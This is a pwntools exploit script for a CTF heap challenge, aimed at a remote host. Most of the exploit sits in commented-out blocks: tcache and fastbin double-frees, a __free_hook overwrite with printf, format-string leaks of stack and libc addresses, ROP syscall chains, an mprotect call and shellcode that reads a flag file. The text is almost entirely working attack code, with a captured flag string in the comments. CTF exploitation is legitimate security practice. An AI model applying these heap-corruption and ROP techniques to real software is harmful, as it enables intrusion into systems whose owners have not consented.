#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.152.242.172 --port 40902 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.152.242.172'
port = int(args.PORT or 40902)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    #,aslr=False
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled


io = start()

secomp = 0x40154a

if args.LOCAL:
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
else:
    libc = ELF("./libc.so.6")

def create(size,msg):
    io.sendlineafter("> ", "1")
    io.sendlineafter(" : ", str(size))
    io.sendafter(" : ", str(msg))

def delete(idx):
    io.sendlineafter("> ", "2")
    io.sendlineafter(" : ", str(idx))

def syscall(rdi, rsi, rdx, rax):
    payload  = p64(libc.sym['pop_rax']) + p64(rax)
    payload += p64(libc.sym['pop_rdi']) + p64(rdi)
    payload += p64(libc.sym['pop_rsi']) + p64(rsi)
    payload += p64(libc.sym['pop_rdx_r12']) + p64(rdx) + p64(0)
    payload += p64(libc.sym['syscall'])
    return payload

libc.sym['pop_rsi']     = 0x027529 # pop rsi; ret;
libc.sym['pop_rdx_r12'] = 0x11c371 # pop rdx; pop r12; ret;
libc.sym['pop_rdi']     = 0x142dda # pop rdi; ret;
libc.sym['pop_rax']     = 0x04a550 # pop rax; ret;
libc.sym['syscall']     = 0x066229 # syscall; ret;
# x/30gx 0x555555558060

# 0 - 6
for _ in range(7):
    create(0x50, 'AAAAAAAA')

# 7 - 13
for _ in range(7):
    create(0x80, 'AAAAAAAA')

# create(0x50, 'AAAAAAAA') # 14
create(0x80, 'AAAAAAAA') # 15
# create(0x50, 'AAAAAAAA') # 16
# create(0x50, 'AAAAAAAA') # 17

for _ in range(7):
    delete(_)

# delete(17)
# delete(14)
# delete(16)
# delete(17)

for i in range(7, 14):
    delete(i)

delete(14)
# create(0x30, '\xa0\xd6') # x/20gx 0x55555555cec0-16
# create(0x40, '\xa0\x96') # x/100gx 0x55555555e410-16

# for _ in range(7):
#     create(0x50, 'A'*8)

# # create(0x50, '\x80')
# create(0x50, '\xc0')
# create(0x50, 'B'*8)
# create(0x50, 'B'*8)
# create(0x50, 'B'*8)

# # pause()
# create(0x50, p64(0xfbad1800) + p64(0) + p64(0) + p64(0) + b'\x08')

# data = io.recvline(0)
# print data
# print data[:8]
# print u64(data[:8])
# _IO_2_1_stdin_ = u64(io.recvline(0)[:8])
# print hex(_IO_2_1_stdin_)
# libc.address = _IO_2_1_stdin_ - libc.sym['_IO_2_1_stdin_']

# print '_IO_2_1_stdin_ ', hex(_IO_2_1_stdin_)

# if _IO_2_1_stdin_ >> 44 != 0x7:
#     io.close()
#     exit()

# print 'libc.address ', hex(libc.address)

# # 31 - 37
# for _ in range(7):
#     create(0x60, 'BBBBBBBB')

# create(0x60, 'BBBBBBBB') # 38
# create(0x60, 'BBBBBBBB') # 39

# for i in range(31, 38):
#     delete(i)

# delete(38)
# delete(39)
# delete(38)

# for _ in range(7):
#     create(0x60, 'BBBBBBBB')

# create(0x60, p64(libc.sym['__free_hook']))
# create(0x60, 'BBBBBBBB')
# create(0x60, '%p||%6$p||') # 49

# # 50 - 56
# for _ in range(7):
#     create(0x70, 'CCCCCCCC')

# create(0x70, 'CCCCCCCC') # 57
# create(0x70, 'CCCCCCCC') # 58

# for i in range(50, 57):
#     delete(i)

# delete(57)
# delete(58)
# delete(57)

# for _ in range(7):
#     create(0x70, 'BBBBBBBB')

# create(0x60, p64(libc.sym['printf']))

# delete(49)

# leaks = io.recvline(0).split(b'||')
# pie   = int(leaks[0], 16)
# stack = int(leaks[1], 16)

# print 'pie (not used) ', hex(pie)
# print 'stack_leak ', hex(stack)

# after_create = stack - 0x38

# create(0x70, p64(after_create))
# create(0x70, 'BBBBBBBB')
# create(0x70, 'BBBBBBBB')

# payload = syscall(0, stack + 24, 0x200, rax=0)

# pause()

# create(0x70, payload)

# file_path_ptr = stack + 0x108
# file_path_ptr = stack + 0x140 +0x18
# print hex(file_path_ptr)
# fd = 3 #5
# payload = syscall(file_path_ptr, 0, 0, rax=2)
# payload += syscall(fd, file_path_ptr, 0x100, rax=78)
# payload += syscall(fd, file_path_ptr, 0x100, rax=0)
# payload += syscall(1, file_path_ptr, 0x100, rax=1)
# print len(payload)

# # payload = syscall(0, stack + 24, 0x200, rax=0)
# # technofair{Welc0m3_back_h34ppy_n1nj4A_here_1s_whAt_you_are_looOking_for}
# # r.sendline(payload + b'flag_07srGoeMn0mlRmC3.txt\0')
# io.sendline(payload + './\x00')
# # b *0x55555555548f
# # b *0x7ffff7df622b

io.interactive()

# try:
#     create(0x50, p64(0xfbad1800) + p64(0) + p64(0) + p64(0) + b'\x08')
#     pause()
#     _IO_2_1_stdin_ = u64(r.recvline(0)[:8])
#     libc.address = _IO_2_1_stdin_ - libc.sym['_IO_2_1_stdin_']

#     print '_IO_2_1_stdin_ ', hex(_IO_2_1_stdin_)

#     if _IO_2_1_stdin_ >> 44 != 0x7:
#         io.close()
#         exit()

#     print 'libc.address ', hex(libc.address)

#     # 31 - 37
#     for _ in range(7):
#         create(0x60, 'BBBBBBBB')

#     create(0x60, 'BBBBBBBB') # 38
#     create(0x60, 'BBBBBBBB') # 39

#     for i in range(31, 38):
#         delete(i)

#     delete(38)
#     delete(39)
#     delete(38)

#     for _ in range(7):
#         create(0x60, 'BBBBBBBB')

#     create(0x60, p64(libc.sym['__free_hook']))
#     create(0x60, 'BBBBBBBB')
#     create(0x60, '%p||%6$p||') # 49

#     # 50 - 56
#     for _ in range(7):
#         create(0x70, 'CCCCCCCC')

#     create(0x70, 'CCCCCCCC') # 57
#     create(0x70, 'CCCCCCCC') # 58

#     for i in range(50, 57):
#         delete(i)

#     delete(57)
#     delete(58)
#     delete(57)

#     for _ in range(7):
#         create(0x70, 'BBBBBBBB')

#     create(0x60, p64(libc.sym['printf']))

#     delete(49)

#     leaks = r.recvline(0).split(b'||')
#     pie   = int(leaks[0], 16)
#     stack = int(leaks[1], 16)

#     print 'pie (not used) ', hex(pie)
#     print 'stack_leak ', hex(stack)

#     after_create = stack - 0x38

#     create(0x70, p64(after_create))
#     create(0x70, 'BBBBBBBB')
#     create(0x70, 'BBBBBBBB')

#     payload = syscall(0, stack + 24, 0x200, rax=0)

#     pause()

#     create(0x70, payload)

#     file_path_ptr = stack + 0x108
#     fd = 3 #5
#     payload = syscall(file_path_ptr, 0, 0, rax=2)
#     payload += syscall(fd, file_path_ptr, 0x100, rax=78)
#     payload += syscall(fd, file_path_ptr, 0x100, rax=0)
#     payload += syscall(1, file_path_ptr, 0x100, rax=1)

#     pause()

#     # technofair{Welc0m3_back_h34ppy_n1nj4A_here_1s_whAt_you_are_looOking_for}
#     # r.sendline(payload + b'flag_07srGoeMn0mlRmC3.txt\0')
#     io.sendline(payload + './\x00')

#     io.interactive()

# except:
#     io.close()


# for _ in range(7):
#     create(0x18, 'A' * 8)
# #
# create(0x18, 'A' * 8)
# create(0x18, 'A' * 8)
# #
# for i in range(7):
#     delete(i)
#
# delete(7)
# delete(8)
# delete(7)
# #
# for _ in range(7):
#     create(0x18, 'A' * 8)
#
# create(2, '\xe0\xa2')
#
# # print (hex(exe.got['free']))
# # print (p64(exe.got['free']))
# for _ in range(7):
#     create(0x70, 'B' * 8)
# #
# create(0x70, 'B' * 8)
# create(0x70, 'B' * 8)
# #
# for i in range(7):
#     delete(i + 17)
# #
# delete(17 + 7)
# delete(17 + 8)
# delete(17 + 7)
# #
# for _ in range(7):
#     create(0x70, 'B' * 8)
#
# create(0x18, 'A' * 8)
# create(0x18, 'A' * 8)
# create(0x18, '%6$p||%21$p||EOF')
#
# delete(17 + +9)

# create(0x18, p64(0x401150)) # elf.plt.printf
#
# delete(34)
#
# leaks = io.recvuntil(b'EOF', 1).split(b'||')
# stack = int(leaks[0], 16)
# if args.LOCAL:
#     libc.address = int(leaks[1], 16) - libc.sym['__libc_start_main'] - 234
# else :
#     libc.address = int(leaks[1], 16) - libc.sym['__libc_start_main'] - 243
# print ('STACK', hex(stack))
# print ('LIBC ', hex(libc.address))
#
# create(0x70, p64(stack - 56))
# create(0x70, 'C' * 8)
# create(0x70, 'C' * 8)
# #
# print (hex(stack))
# stack_base = (stack & ~0xfff) - 0x1e000
#
# print "stack base", hex(stack_base)
#
# rop = ROP(libc)
# rop.call(libc.sym['mprotect'], [stack_base, 0x21000, 0x7])
# # #
# # rop1 = bytes(rop)
# # print rop1
# print rop.dump()
# rop = rop.chain()
# # print rop
#
# sleep(0.5)
# # #
# #
# shellcode = '''
# xor rdi, rdi
# lea rsi, [rsp+8]
# mov rdx, 0x200
# xor rax, rax
# syscall
# '''
#
# # gdb.attach(io,'''
# # b *0x401470
# # b *0x401475
# # # c
# # ''')
#
# p = rop + p64(stack - 56 + len(rop)+8) + asm(shellcode)
# print "len rop :",len(rop)
# print "len payload :", len(p)
# assert p > 0x70
# # create(0x70, rop + p64(stack - 56 + 0x48 - 8) + asm(shellcode))
# create(0x70, p)
#
# shellcode = '''
# xor rax, rax
# add rsp, 0x100
# '''
# # shellcode += shellcraft.pushstr('/app/flag_i5HR6cBpwxxyTixR.txt')
# shellcode += shellcraft.pushstr('./flag.txt')
# # shellcode += shellcraft.pushstr('./')
# shellcode += shellcraft.open('rsp', 0, 0)
# # shellcode += shellcraft.getdents64('rax', 'rsp', 0x200)
# shellcode += shellcraft.read('rax', 'rsp', 0x200)
# shellcode += shellcraft.write(1, 'rsp', 0x200)
#
# # print shellcode
#
# shellcode = b'A' * 13 + asm(shellcode)
#
# io.sendline(shellcode)

# io.interactive()
